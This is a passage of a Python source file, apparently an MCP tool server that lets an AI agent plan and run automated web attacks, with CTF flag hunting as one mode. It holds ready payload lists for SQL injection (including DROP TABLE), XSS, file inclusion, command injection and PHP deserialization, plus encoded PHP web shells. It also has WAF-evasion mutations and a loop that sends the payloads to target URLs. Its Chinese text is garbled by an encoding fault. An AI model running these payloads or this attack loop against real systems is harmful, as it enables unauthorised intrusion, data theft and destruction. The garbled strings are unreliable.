        AIå­¦ä¹ åé¦ˆå·¥å…· - è®©AIå‘ç³»ç»Ÿåé¦ˆå­¦ä¹ ç»“æœï¼ŒæŒç»­æ”¹è¿›

        Args:
            session_id: æ”»å‡»ä¼šè¯ID
            success_patterns: AIè¯†åˆ«çš„æˆåŠŸæ¨¡å¼
            failure_analysis: AIçš„å¤±è´¥åˆ†æ
            new_insights: AIçš„æ–°è§è§£
            confidence_score: AIå¯¹è¿™æ¬¡å­¦ä¹ çš„ç½®ä¿¡åº¦

        Returns:
            å­¦ä¹ åé¦ˆå¤„ç†ç»“æœ
        """
        try:
            logger.info(f"ğŸ§  AIå­¦ä¹ åé¦ˆå¤„ç†...")

            # åˆå§‹åŒ–å­¦ä¹ æ•°æ®åº“
            global ai_learning_database
            if 'ai_learning_database' not in globals():
                ai_learning_database = {
                    'success_patterns': [],
                    'failure_analyses': [],
                    'insights': [],
                    'learning_sessions': {}
                }

            learning_entry = {
                'learning_id': str(uuid.uuid4()),
                'session_id': session_id,
                'success_patterns': success_patterns,
                'failure_analysis': failure_analysis,
                'new_insights': new_insights,
                'confidence_score': confidence_score,
                'timestamp': datetime.now().isoformat(),
                'applied_count': 0
            }

            # å­˜å‚¨å­¦ä¹ ç»“æœ
            if success_patterns:
                ai_learning_database['success_patterns'].append({
                    'pattern': success_patterns,
                    'confidence': confidence_score,
                    'session_id': session_id,
                    'timestamp': datetime.now().isoformat()
                })

            if failure_analysis:
                ai_learning_database['failure_analyses'].append({
                    'analysis': failure_analysis,
                    'confidence': confidence_score,
                    'session_id': session_id,
                    'timestamp': datetime.now().isoformat()
                })

            if new_insights:
                ai_learning_database['insights'].append({
                    'insight': new_insights,
                    'confidence': confidence_score,
                    'session_id': session_id,
                    'timestamp': datetime.now().isoformat()
                })

            ai_learning_database['learning_sessions'][session_id] = learning_entry

            # åˆ†æå­¦ä¹ è´¨é‡
            learning_quality = _assess_ai_learning_quality(learning_entry)

            # æ›´æ–°ç³»ç»ŸçŸ¥è¯†åº“
            knowledge_updates = _update_system_knowledge(learning_entry, learning_quality)

            logger.info(f"âœ… AIå­¦ä¹ åé¦ˆå·²å¤„ç†ï¼Œå­¦ä¹ ID: {learning_entry['learning_id']}")
            return {
                "success": True,
                "learning_id": learning_entry['learning_id'],
                "learning_quality_assessment": learning_quality,
                "knowledge_updates": knowledge_updates,
                "learning_database_stats": {
                    "total_success_patterns": len(ai_learning_database['success_patterns']),
                    "total_failure_analyses": len(ai_learning_database['failure_analyses']),
                    "total_insights": len(ai_learning_database['insights']),
                    "total_learning_sessions": len(ai_learning_database['learning_sessions'])
                },
                "message": f"AIå­¦ä¹ åé¦ˆå·²å¤„ç† - è´¨é‡è¯„åˆ†: {learning_quality['overall_score']:.2f}"
            }

        except Exception as e:
            logger.error(f"AIå­¦ä¹ åé¦ˆå¤„ç†å¤±è´¥: {e}")
            return {
                "success": False,
                "error": str(e),
                "message": "AIå­¦ä¹ åé¦ˆå¤„ç†å¤±è´¥"
            }

    @mcp.tool()
    async def ai_strategic_decision_making(
        current_situation: str,
        available_options: List[str],
        ai_reasoning: str,
        risk_tolerance: str = "medium"
    ) -> Dict[str, Any]:
        """
        AIæˆ˜ç•¥å†³ç­–åˆ¶å®šå·¥å…· - å¸®åŠ©AIåœ¨å¤æ‚æƒ…å†µä¸‹åšå‡ºæœ€ä¼˜å†³ç­–

        Args:
            current_situation: å½“å‰æƒ…å†µæè¿°
            available_options: å¯ç”¨é€‰é¡¹åˆ—è¡¨
            ai_reasoning: AIçš„æ¨ç†è¿‡ç¨‹
            risk_tolerance: é£é™©æ‰¿å—åº¦ (low/medium/high)

        Returns:
            AIæˆ˜ç•¥å†³ç­–å»ºè®®
        """
        try:
            logger.info(f"ğŸ§  AIæˆ˜ç•¥å†³ç­–åˆ¶å®š...")
            logger.info(f"å½“å‰æƒ…å†µ: {current_situation}")

            decision_session = {
                'decision_id': str(uuid.uuid4()),
                'situation': current_situation,
                'options': available_options,
                'ai_reasoning': ai_reasoning,
                'risk_tolerance': risk_tolerance,
                'timestamp': datetime.now().isoformat()
            }

            # åˆ†ææ¯ä¸ªé€‰é¡¹
            option_analyses = []
            for option in available_options:
                analysis = _analyze_strategic_option(option, current_situation, ai_reasoning, risk_tolerance)
                option_analyses.append(analysis)

            # ç”Ÿæˆå†³ç­–çŸ©é˜µ
            decision_matrix = _generate_ai_decision_matrix(option_analyses, current_situation, risk_tolerance)

            # æ¨èæœ€ä½³é€‰é¡¹
            best_option = max(option_analyses, key=lambda x: x['overall_score'])

            # ç”Ÿæˆé£é™©è¯„ä¼°
            risk_assessment = _generate_risk_assessment(best_option, current_situation, risk_tolerance)

            # ç”Ÿæˆæ‰§è¡Œå»ºè®®
            execution_recommendations = _generate_execution_recommendations(best_option, decision_matrix)

            logger.info(f"âœ… AIæˆ˜ç•¥å†³ç­–å®Œæˆï¼Œæ¨èé€‰é¡¹: {best_option['option']}")
            return {
                "success": True,
                "decision_session_id": decision_session['decision_id'],
                "strategic_analysis": {
                    "situation_assessment": current_situation,
                    "ai_reasoning_applied": ai_reasoning,
                    "risk_tolerance": risk_tolerance,
                    "options_analyzed": len(available_options)
                },
                "decision_recommendation": {
                    "recommended_option": best_option['option'],
                    "confidence_score": best_option['overall_score'],
                    "reasoning": best_option['reasoning'],
                    "expected_outcome": best_option['expected_outcome']
                },
                "option_analyses": option_analyses,
                "decision_matrix": decision_matrix,
                "risk_assessment": risk_assessment,
                "execution_recommendations": execution_recommendations,
                "alternative_options": sorted(option_analyses, key=lambda x: x['overall_score'], reverse=True)[1:3],
                "message": f"AIæˆ˜ç•¥å†³ç­–å®Œæˆ - æ¨è: {best_option['option']} (ç½®ä¿¡åº¦: {best_option['overall_score']:.2f})"
            }

        except Exception as e:
            logger.error(f"AIæˆ˜ç•¥å†³ç­–åˆ¶å®šå¤±è´¥: {e}")
            return {
                "success": False,
                "error": str(e),
                "message": "AIæˆ˜ç•¥å†³ç­–åˆ¶å®šå¤±è´¥"
            }

    # ==================== AIæ™ºèƒ½åŒ–è¾…åŠ©å‡½æ•° ====================

    async def _ai_enhanced_tech_detection(target_url: str, ai_context: str) -> Dict[str, Any]:
        """AIå¢å¼ºçš„æŠ€æœ¯æ£€æµ‹"""
        # åŸºç¡€æŠ€æœ¯æ£€æµ‹
        tech_detection = {"success": False, "error": "æœ¬åœ°æ‰§è¡Œæ¨¡å¼"}

        # AIä¸Šä¸‹æ–‡å¢å¼º
        ai_insights = _extract_ai_insights(ai_context)

        return {
            "detected_technologies": tech_detection.get("technologies", []),
            "ai_insights": ai_insights,
            "confidence": 0.85,
            "enhancement_applied": bool(ai_context)
        }

    async def _ai_vulnerability_surface_mapping(target_url: str, tech_fingerprints: Dict) -> Dict[str, Any]:
        """AIæ¼æ´è¡¨é¢æ˜ å°„"""
        vulnerabilities = []
        confidence = 0.7

        # åŸºäºæŠ€æœ¯æ ˆæ¨æ–­æ¼æ´
        for tech in tech_fingerprints.get("detected_technologies", []):
            if "php" in tech.lower():
                vulnerabilities.extend(["deserialization", "file_inclusion", "code_injection"])
            elif "mysql" in tech.lower():
                vulnerabilities.extend(["sql_injection", "blind_sql"])
            elif "apache" in tech.lower():
                vulnerabilities.extend(["path_traversal", "server_side_include"])

        return {
            "potential_vulnerabilities": vulnerabilities,
            "attack_surface_score": len(vulnerabilities) * 0.1,
            "confidence": confidence
        }

    def _ai_attack_vector_recommendation(tech_fingerprints: Dict, vulnerability_surface: Dict, ai_context: str) -> Dict[str, Any]:
        """AIæ”»å‡»å‘é‡æ¨è"""
        high_priority = []
        medium_priority = []
        experimental = []
        ai_custom = []

        vulnerabilities = vulnerability_surface.get("potential_vulnerabilities", [])

        # é«˜ä¼˜å…ˆçº§å‘é‡
        if "sql_injection" in vulnerabilities:
            high_priority.append("sql_injection")
        if "deserialization" in vulnerabilities:
            high_priority.append("deserialization")

        # ä¸­ä¼˜å…ˆçº§å‘é‡
        if "file_inclusion" in vulnerabilities:
            medium_priority.append("file_inclusion")
        if "xss" in vulnerabilities:
            medium_priority.append("xss")

        # å®éªŒæ€§å‘é‡
        experimental.extend(["xxe", "ssrf", "template_injection"])

        # AIè‡ªå®šä¹‰å‘é‡ï¼ˆåŸºäºAIä¸Šä¸‹æ–‡ï¼‰
        if "ctf" in ai_context.lower():
            ai_custom.extend(["flag_extraction", "hidden_endpoints", "encoding_bypass"])

        return {
            "high_priority": high_priority,
            "medium_priority": medium_priority,
            "experimental": experimental,
            "ai_custom": ai_custom,
            "confidence": 0.9
        }

    async def _ai_endpoint_discovery(target_url: str, analysis_depth: str) -> List[str]:
        """AIç«¯ç‚¹å‘ç°"""
        # åŸºç¡€ç«¯ç‚¹å‘ç°
        endpoints = ["/", "/admin", "/login", "/api", "/config"]

        if analysis_depth in ["comprehensive", "deep"]:
            endpoints.extend(["/backup", "/test", "/dev", "/debug", "/flag"])

        return endpoints

    def _extract_ai_insights(ai_context: str) -> List[str]:
        """ä»AIä¸Šä¸‹æ–‡ä¸­æå–è§è§£"""
        insights = []
        if "php" in ai_context.lower():
            insights.append("PHPç¯å¢ƒï¼Œå…³æ³¨ååºåˆ—åŒ–å’Œæ–‡ä»¶åŒ…å«")
        if "ctf" in ai_context.lower():
            insights.append("CTFç¯å¢ƒï¼Œé‡ç‚¹å¯»æ‰¾flagæ–‡ä»¶")
        if "sql" in ai_context.lower():
            insights.append("æ•°æ®åº“ç›¸å…³ï¼ŒSQLæ³¨å…¥æ¦‚ç‡é«˜")
        return insights

    def _ai_recommended_approach(tech_fingerprints: Dict, ai_context: str) -> str:
        """AIæ¨èçš„æ”»å‡»æ–¹æ³•"""
        technologies = tech_fingerprints.get("detected_technologies", [])

        if any("php" in tech.lower() for tech in technologies):
            return "PHPç¯å¢ƒï¼šä¼˜å…ˆå°è¯•æ–‡ä»¶åŒ…å«ã€ååºåˆ—åŒ–ã€ä»£ç æ³¨å…¥"
        elif any("sql" in tech.lower() for tech in technologies):
            return "æ•°æ®åº“ç¯å¢ƒï¼šé‡ç‚¹è¿›è¡ŒSQLæ³¨å…¥æµ‹è¯•"
        else:
            return "é€šç”¨Webç¯å¢ƒï¼šä»XSSå’Œç›®å½•éå†å¼€å§‹"

    def _generate_ai_next_steps(tech_fingerprints: Dict, vulnerability_surface: Dict) -> List[str]:
        """ç”ŸæˆAIä¸‹ä¸€æ­¥å»ºè®®"""
        steps = []
        vulnerabilities = vulnerability_surface.get("potential_vulnerabilities", [])

        if "sql_injection" in vulnerabilities:
            steps.append("ç”ŸæˆSQLæ³¨å…¥Payloadå¹¶æµ‹è¯•")
        if "deserialization" in vulnerabilities:
            steps.append("æ„é€ ååºåˆ—åŒ–Payload")

        steps.append("å¹¶è¡Œæ‰§è¡Œå¤šç§æ”»å‡»å‘é‡")
        steps.append("ç›‘æ§å“åº”å¹¶è‡ªé€‚åº”è°ƒæ•´ç­–ç•¥")

        return steps

    def _suggest_payload_strategies(tech_fingerprints: Dict, ai_context: str) -> Dict[str, List[str]]:
        """å»ºè®®Payloadç­–ç•¥"""
        strategies = {
            "encoding": ["URLç¼–ç ", "Unicodeç¼–ç ", "Base64ç¼–ç "],
            "evasion": ["WAFç»•è¿‡", "å…³é”®è¯æ›¿æ¢", "æ³¨é‡Šæ’å…¥"],
            "context": ["åŸºäºæŠ€æœ¯æ ˆå®šåˆ¶", "AIä¸Šä¸‹æ–‡å¢å¼º"]
        }

        if "waf" in ai_context.lower():
            strategies["priority"] = strategies["evasion"]
        else:
            strategies["priority"] = strategies["context"]

        return strategies

    def _identify_learning_opportunities(tech_fingerprints: Dict, vulnerability_surface: Dict) -> List[str]:
        """è¯†åˆ«å­¦ä¹ æœºä¼š"""
        opportunities = []

        if len(tech_fingerprints.get("detected_technologies", [])) > 3:
            opportunities.append("å¤æ‚æŠ€æœ¯æ ˆç»„åˆåˆ†æ")

        if vulnerability_surface.get("attack_surface_score", 0) > 0.5:
            opportunities.append("é«˜é£é™©ç›®æ ‡æ”»å‡»ç­–ç•¥ä¼˜åŒ–")

        opportunities.append("æˆåŠŸæ¨¡å¼æ€»ç»“ä¸åº”ç”¨")

        return opportunities

    # ==================== AI Payloadç”Ÿæˆè¾…åŠ©å‡½æ•° ====================

    def _get_base_payloads_for_ai(attack_type: str) -> List[str]:
        """è·å–AIä¸“ç”¨çš„åŸºç¡€Payloadæ¨¡æ¿"""
        ai_payload_templates = {
            "sql_injection": [
                "' OR '1'='1'--",
                "' UNION SELECT NULL,NULL,NULL--",
                "'; DROP TABLE users--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>"
            ],
            "file_inclusion": [
                "../../../../etc/passwd",
                "php://filter/read=convert.base64-encode/resource=flag.php",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=",
                "../flag.txt"
            ],
            "command_injection": [
                "; cat /etc/passwd",
                "| whoami",
                "&& ls -la",
                "`id`",
                "$(cat flag.txt)"
            ],
            "deserialization": [
                'O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}',
                'a:2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}',
                'O:8:"stdClass":1:{s:4:"data";s:22:"<?php system($_GET[x]); ?>";}'
            ]
        }

        return ai_payload_templates.get(attack_type, ["test"])

    def _generate_hypothesis_based_payloads(ai_hypothesis: str, attack_type: str, context_data: Dict) -> List[str]:
        """åŸºäºAIå‡è®¾ç”ŸæˆPayload"""
        hypothesis_payloads = []
        hypothesis_lower = ai_hypothesis.lower()

        if "mysql" in hypothesis_lower and attack_type == "sql_injection":
            hypothesis_payloads.extend([
                "' AND (SELECT @@version)>0--",
                "' UNION SELECT @@version,@@datadir,@@hostname--",
                "' AND (SELECT COUNT(*) FROM mysql.user)>0--"
            ])

        if "php" in hypothesis_lower and attack_type == "file_inclusion":
            hypothesis_payloads.extend([
                "php://input",
                "php://filter/convert.base64-encode/resource=index.php",
                "expect://id"
            ])

        if "ctf" in hypothesis_lower:
            hypothesis_payloads.extend([
                "../../../../flag.txt",
                "flag.php",
                "../flag",
                "' UNION SELECT flag FROM flags--"
            ])

        return hypothesis_payloads

    def _generate_feedback_improved_payloads(historical_feedback: str, attack_type: str, base_payloads: List[str]) -> List[str]:
        """åŸºäºå†å²åé¦ˆæ”¹è¿›Payload"""
        improved_payloads = []
        feedback_lower = historical_feedback.lower()

        if "waf" in feedback_lower or "blocked" in feedback_lower:
            # WAFç»•è¿‡æ”¹è¿›
            for payload in base_payloads[:3]:
                improved_payloads.extend([
                    payload.replace(" ", "/**/"),
                    payload.replace("'", "\\'"),
                    payload.replace("SELECT", "SEL/**/ECT"),
                    payload.replace("UNION", "UNI/**/ON")
                ])

        if "timeout" in feedback_lower:
            # æ—¶é—´ä¼˜åŒ–æ”¹è¿›
            for payload in base_payloads[:2]:
                if "SLEEP" not in payload:
                    improved_payloads.append(f"'; SELECT SLEEP(1)--")

        return improved_payloads

    def _generate_context_adaptive_payloads(context_data: Dict, attack_type: str, creativity_level: float) -> List[str]:
        """ç”Ÿæˆä¸Šä¸‹æ–‡è‡ªé€‚åº”Payload"""
        adaptive_payloads = []

        # åŸºäºæŠ€æœ¯æ ˆé€‚åº”
        tech_stack = context_data.get("technology_stack", {})

        if tech_stack.get("detected_technologies"):
            for tech in tech_stack["detected_technologies"]:
                if "apache" in tech.lower() and attack_type == "file_inclusion":
                    adaptive_payloads.extend([
                        "/var/log/apache2/access.log",
                        "/etc/apache2/apache2.conf"
                    ])
                elif "nginx" in tech.lower():
                    adaptive_payloads.extend([
                        "/var/log/nginx/access.log",
                        "/etc/nginx/nginx.conf"
                    ])

        # åŸºäºåˆ›æ–°ç¨‹åº¦
        if creativity_level > 0.7:
            adaptive_payloads.extend([
                "data:text/html,<script>alert('creative')</script>",
                "javascript:alert('creative')",
                f"'; SELECT '{uuid.uuid4().hex[:8]}'--"
            ])

        return adaptive_payloads

    def _generate_creative_payloads(attack_type: str, ai_hypothesis: str, creativity_level: float) -> List[str]:
        """ç”Ÿæˆåˆ›æ–°æ€§Payload"""
        creative_payloads = []

        if creativity_level > 0.8:
            # é«˜åˆ›æ–°åº¦Payload
            if attack_type == "sql_injection":
                creative_payloads.extend([
                    f"'; SELECT '{random.randint(1000,9999)}'--",
                    "' OR '1'='1' AND '1'='1'--",
                    "' UNION SELECT CONCAT(username,':',password) FROM users--"
                ])
            elif attack_type == "xss":
                creative_payloads.extend([
                    f"<img src=x onerror=alert('{random.randint(1000,9999)}')>",
                    "<svg/onload=alert('creative')>",
                    "<details open ontoggle=alert('creative')>"
                ])

        return creative_payloads

    def _generate_combination_payloads(base_payloads: List[str], enhanced_payloads: List[str], context_data: Dict) -> List[str]:
        """ç”Ÿæˆç»„åˆå’Œå˜å¼‚Payload"""
        combination_payloads = []

        # ç®€å•ç»„åˆ
        if len(base_payloads) >= 2 and len(enhanced_payloads) >= 2:
            combination_payloads.append(f"{base_payloads[0]} AND {enhanced_payloads[0]}")
            combination_payloads.append(f"{base_payloads[1]} OR {enhanced_payloads[1]}")

        return combination_payloads

    def _calculate_payload_quality_score(payload: str, context_data: Dict, ai_hypothesis: str) -> float:
        """è®¡ç®—Payloadè´¨é‡è¯„åˆ†"""
        score = 0.5  # åŸºç¡€åˆ†

        # é•¿åº¦é€‚ä¸­åŠ åˆ†
        if 10 <= len(payload) <= 100:
            score += 0.1

        # åŒ…å«å…³é”®è¯åŠ åˆ†
        keywords = ["SELECT", "UNION", "alert", "script", "file", "etc", "flag"]
        for keyword in keywords:
            if keyword.lower() in payload.lower():
                score += 0.05

        # ä¸AIå‡è®¾åŒ¹é…åŠ åˆ†
        if ai_hypothesis:
            hypothesis_keywords = ai_hypothesis.lower().split()
            for keyword in hypothesis_keywords:
                if keyword in payload.lower():
                    score += 0.1

        # ä¸Šä¸‹æ–‡ç›¸å…³æ€§åŠ åˆ†
        if context_data.get("technology_stack"):
            tech_stack = context_data["technology_stack"]
            if any(tech.lower() in payload.lower() for tech in tech_stack.get("detected_technologies", [])):
                score += 0.15

        return min(score, 1.0)

    def _identify_generation_method(payload: str, all_payloads: List[str]) -> str:
        """è¯†åˆ«Payloadç”Ÿæˆæ–¹æ³•"""
        if "/*" in payload:
            return "waf_bypass"
        elif any(char in payload for char in ["'", '"', ";"]):
            return "injection_based"
        elif "<" in payload and ">" in payload:
            return "xss_based"
        elif "php://" in payload or "data://" in payload:
            return "file_inclusion"
        else:
            return "general"

    def _estimate_payload_success_rate(payload: str, context_data: Dict) -> float:
        """ä¼°ç®—PayloadæˆåŠŸç‡"""
        base_rate = 0.3

        # åŸºäºå¤æ‚åº¦è°ƒæ•´
        if len(payload) > 50:
            base_rate -= 0.1

        # åŸºäºä¸Šä¸‹æ–‡è°ƒæ•´
        if context_data.get("technology_stack"):
            tech_count = len(context_data["technology_stack"].get("detected_technologies", []))
            base_rate += tech_count * 0.05

        return min(base_rate, 0.9)

    # ==================== AIæ”»å‡»æ‰§è¡Œè¾…åŠ©å‡½æ•° ====================

    def _parse_ai_success_criteria(success_criteria: str) -> Dict[str, Any]:
        """è§£æAIæˆåŠŸæ ‡å‡†"""
        indicators = {
            "flag_patterns": [r"ctf\{[^}]+\}", r"flag\{[^}]+\}", r"FLAG\{[^}]+\}"],
            "error_patterns": [r"error", r"exception", r"warning"],
            "success_keywords": ["admin", "success", "welcome", "logged in"],
            "response_codes": [200, 302, 500]
        }

        criteria_lower = success_criteria.lower()
        if "flag" in criteria_lower:
            indicators["priority"] = "flag_detection"
        elif "error" in criteria_lower:
            indicators["priority"] = "error_based"
        else:
            indicators["priority"] = "general"

        return indicators

    async def _execute_single_ai_attack(target_url: str, payload: str, success_indicators: Dict) -> Dict[str, Any]:
        """æ‰§è¡Œå•ä¸ªAIæ”»å‡»"""
        try:
            import aiohttp
            import asyncio

            # æ„é€ æ”»å‡»URL
            attack_url = f"{target_url}?test={payload}"

            async with aiohttp.ClientSession() as session:
                start_time = datetime.now()
                async with session.get(attack_url, timeout=10) as response:
                    response_body = await response.text()
                    response_time = (datetime.now() - start_time).total_seconds()

                    # åˆ†æå“åº”
                    analysis = {
                        "success": False,
                        "response_code": response.status,
                        "response_time": response_time,
                        "response_body": response_body[:1000],  # é™åˆ¶é•¿åº¦
                        "flags": [],
                        "vulnerabilities": [],
                        "errors": []
                    }

                    # æ£€æŸ¥Flag
                    for pattern in success_indicators.get("flag_patterns", []):
                        import re
                        flags = re.findall(pattern, response_body, re.IGNORECASE)
                        if flags:
                            analysis["flags"].extend(flags)
                            analysis["success"] = True

                    # æ£€æŸ¥é”™è¯¯æŒ‡ç¤ºå™¨
                    for pattern in success_indicators.get("error_patterns", []):
                        if re.search(pattern, response_body, re.IGNORECASE):
                            analysis["errors"].append(pattern)
                            if "sql" in pattern.lower():
                                analysis["vulnerabilities"].append("sql_injection")

                    # æ£€æŸ¥æˆåŠŸå…³é”®è¯
                    for keyword in success_indicators.get("success_keywords", []):
                        if keyword.lower() in response_body.lower():
                            analysis["success"] = True

                    return analysis

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "response_code": 0,
                "response_time": 0,
                "flags": [],
                "vulnerabilities": [],
                "errors": [str(e)]
            }

    def _check_ai_success_criteria(attack_result: Dict, success_indicators: Dict) -> bool:
        """æ£€æŸ¥AIæˆåŠŸæ ‡å‡†"""
        priority = success_indicators.get("priority", "general")

        if priority == "flag_detection":
            return len(attack_result.get("flags", [])) > 0
        elif priority == "error_based":
            return len(attack_result.get("errors", [])) > 0
        else:
            return attack_result.get("success", False)

    async def _ai_adaptive_strategy_adjustment(recent_results: List[Dict], current_strategy: str, adaptation_strategy: str) -> Dict[str, Any]:
        """AIè‡ªé€‚åº”ç­–ç•¥è°ƒæ•´"""
        success_rate = len([r for r in recent_results if r.get("success")]) / len(recent_results)

        if success_rate < 0.2:  # æˆåŠŸç‡è¿‡ä½
            return {
                "action_type": "strategy_change",
                "new_strategy": "fallback_strategy",
                "reason": f"æˆåŠŸç‡è¿‡ä½ ({success_rate:.1%})",
                "adjustment": "å¢åŠ Payloadå¤šæ ·æ€§"
            }
        elif success_rate > 0.8:  # æˆåŠŸç‡å¾ˆé«˜
            return {
                "action_type": "strategy_optimize",
                "new_strategy": "aggressive_strategy",
                "reason": f"æˆåŠŸç‡å¾ˆé«˜ ({success_rate:.1%})",
                "adjustment": "é›†ä¸­æ”»å‡»æˆåŠŸå‘é‡"
            }
        else:
            return {
                "action_type": "continue",
                "reason": f"æˆåŠŸç‡æ­£å¸¸ ({success_rate:.1%})"
            }

    def _analyze_ai_attack_execution(attack_results: List[Dict], success_indicators: Dict, adaptation_actions: List[Dict]) -> Dict[str, Any]:
        """åˆ†æAIæ”»å‡»æ‰§è¡Œç»“æœ"""
        total_attacks = len(attack_results)
        successful_attacks = len([r for r in attack_results if r.get("success")])

        analysis = {
            "success_rate": successful_attacks / total_attacks if total_attacks > 0 else 0,
            "avg_response_time": sum(r.get("response_time", 0) for r in attack_results) / total_attacks if total_attacks > 0 else 0,
            "plan_effectiveness": "é«˜" if successful_attacks / total_attacks > 0.6 else "ä¸­" if successful_attacks / total_attacks > 0.3 else "ä½",
            "adaptation_effectiveness": "é«˜" if len(adaptation_actions) > 0 and any(a["action_type"] != "continue" for a in adaptation_actions) else "ä¸­",
            "payload_quality": "é«˜" if sum(len(r.get("flags", [])) for r in attack_results) > 0 else "ä¸­",
            "learning_insights": [
                f"æˆåŠŸç‡: {successful_attacks / total_attacks:.1%}",
                f"å¹³å‡å“åº”æ—¶é—´: {sum(r.get('response_time', 0) for r in attack_results) / total_attacks:.2f}ç§’" if total_attacks > 0 else "æ— æ•°æ®",
                f"ç­–ç•¥è°ƒæ•´æ¬¡æ•°: {len(adaptation_actions)}"
            ],
            "success_criteria_met": any(len(r.get("flags", [])) > 0 for r in attack_results),
            "duration": f"{total_attacks * 2}ç§’ï¼ˆä¼°ç®—ï¼‰"
        }

        return analysis

    # ==================== AIå­¦ä¹ å’Œå†³ç­–è¾…åŠ©å‡½æ•° ====================

    def _assess_ai_learning_quality(learning_entry: Dict) -> Dict[str, Any]:
        """è¯„ä¼°AIå­¦ä¹ è´¨é‡"""
        quality_score = 0.5

        # å†…å®¹ä¸°å¯Œåº¦
        if learning_entry.get("success_patterns"):
            quality_score += 0.2
        if learning_entry.get("failure_analysis"):
            quality_score += 0.2
        if learning_entry.get("new_insights"):
            quality_score += 0.2

        # ç½®ä¿¡åº¦å› å­
        confidence = learning_entry.get("confidence_score", 0.5)
        quality_score = quality_score * confidence

        return {
            "overall_score": min(quality_score, 1.0),
            "content_richness": 0.8 if all([learning_entry.get("success_patterns"), learning_entry.get("failure_analysis"), learning_entry.get("new_insights")]) else 0.5,
            "confidence_factor": confidence,
            "applicability": "é«˜" if quality_score > 0.7 else "ä¸­" if quality_score > 0.4 else "ä½"
        }

    def _update_system_knowledge(learning_entry: Dict, learning_quality: Dict) -> Dict[str, Any]:
        """æ›´æ–°ç³»ç»ŸçŸ¥è¯†åº“"""
        updates = {
            "patterns_updated": 0,
            "insights_added": 0,
            "knowledge_base_version": "1.0"
        }

        if learning_quality["overall_score"] > 0.6:
            if learning_entry.get("success_patterns"):
                updates["patterns_updated"] += 1
            if learning_entry.get("new_insights"):
                updates["insights_added"] += 1

        return updates

    def _analyze_strategic_option(option: str, situation: str, ai_reasoning: str, risk_tolerance: str) -> Dict[str, Any]:
        """åˆ†ææˆ˜ç•¥é€‰é¡¹"""
        # ç®€åŒ–çš„é€‰é¡¹åˆ†æ
        base_score = 0.5

        # åŸºäºé£é™©æ‰¿å—åº¦è°ƒæ•´
        risk_multiplier = {"low": 0.8, "medium": 1.0, "high": 1.2}.get(risk_tolerance, 1.0)

        # åŸºäºé€‰é¡¹ç±»å‹è°ƒæ•´
        if "æ”»å‡»" in option or "exploit" in option.lower():
            base_score += 0.2 if risk_tolerance == "high" else -0.1
        elif "åˆ†æ" in option or "analyze" in option.lower():
            base_score += 0.1
        elif "ç­‰å¾…" in option or "wait" in option.lower():
            base_score -= 0.2

        overall_score = base_score * risk_multiplier

        return {
            "option": option,
            "overall_score": min(overall_score, 1.0),
            "risk_level": "é«˜" if "æ”»å‡»" in option else "ä¸­" if "åˆ†æ" in option else "ä½",
            "expected_outcome": f"åŸºäº {option} çš„é¢„æœŸç»“æœ",
            "reasoning": f"è€ƒè™‘é£é™©æ‰¿å—åº¦ ({risk_tolerance}) å’Œå½“å‰æƒ…å†µçš„åˆ†æç»“æœ"
        }

    def _generate_ai_decision_matrix(option_analyses: List[Dict], situation: str, risk_tolerance: str) -> Dict[str, Any]:
        """ç”ŸæˆAIå†³ç­–çŸ©é˜µ"""
        matrix = {
            "criteria": ["æˆåŠŸæ¦‚ç‡", "é£é™©çº§åˆ«", "èµ„æºæ¶ˆè€—", "æ—¶é—´æˆæœ¬"],
            "weights": {"low": [0.4, 0.4, 0.1, 0.1], "medium": [0.35, 0.25, 0.2, 0.2], "high": [0.3, 0.1, 0.3, 0.3]}.get(risk_tolerance, [0.25, 0.25, 0.25, 0.25]),
            "option_scores": {analysis["option"]: analysis["overall_score"] for analysis in option_analyses}
        }

        return matrix

    def _generate_risk_assessment(best_option: Dict, situation: str, risk_tolerance: str) -> Dict[str, Any]:
        """ç”Ÿæˆé£é™©è¯„ä¼°"""
        return {
            "option": best_option["option"],
            "risk_level": best_option["risk_level"],
            "mitigation_strategies": [
                "ç›‘æ§æ‰§è¡Œè¿‡ç¨‹",
                "è®¾ç½®å›é€€ç­–ç•¥",
                "é™åˆ¶æ”»å‡»å¼ºåº¦"
            ],
            "success_probability": best_option["overall_score"],
            "recommended_precautions": ["å¤‡ä»½å½“å‰çŠ¶æ€", "è®¾ç½®è¶…æ—¶é™åˆ¶"]
        }

    def _generate_execution_recommendations(best_option: Dict, decision_matrix: Dict) -> List[str]:
        """ç”Ÿæˆæ‰§è¡Œå»ºè®®"""
        recommendations = [
            f"æ‰§è¡Œé€‰æ‹©çš„ç­–ç•¥: {best_option['option']}",
            f"ç›‘æ§æˆåŠŸæŒ‡æ ‡: {best_option['expected_outcome']}",
            "åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä¿æŒè‡ªé€‚åº”è°ƒæ•´",
            "è®°å½•æ‰§è¡Œç»“æœç”¨äºåç»­å­¦ä¹ "
        ]

        if best_option["risk_level"] == "é«˜":
            recommendations.append("é«˜é£é™©é€‰é¡¹ï¼Œå»ºè®®åˆ†é˜¶æ®µæ‰§è¡Œ")

        return recommendations

    return mcp

# ==================== å¤šç›®æ ‡åè°ƒå’Œæ”»å‡»ç¼–æ’ç³»ç»Ÿ ====================

@dataclass
class TargetProfile:
    """ç›®æ ‡é…ç½®æ–‡ä»¶æ•°æ®ç±»"""
    target_id: str
    target_url: str
    target_type: str = "unknown"  # web, network, mobile, cloud
    priority: int = 1  # 1-10, 10 ä¸ºæœ€é«˜ä¼˜å…ˆçº§
    status: str = "pending"  # pending, active, completed, failed
    assigned_strategy: Optional[str] = None
    discovered_assets: Dict[str, Any] = field(default_factory=dict)
    vulnerabilities: List[Dict[str, Any]] = field(default_factory=list)
    attack_progress: Dict[str, Any] = field(default_factory=dict)
    dependency_targets: List[str] = field(default_factory=list)  # ä¾èµ–çš„å…¶ä»–ç›®æ ‡
    estimated_completion_time: Optional[datetime] = None
    last_update: datetime = field(default_factory=datetime.now)
    metadata: Dict[str, Any] = field(default_factory=dict)

@dataclass
class AttackTask:
    """æ”»å‡»ä»»åŠ¡æ•°æ®ç±»"""
    task_id: str = field(default_factory=lambda: str(uuid.uuid4()))
    target_id: str = ""
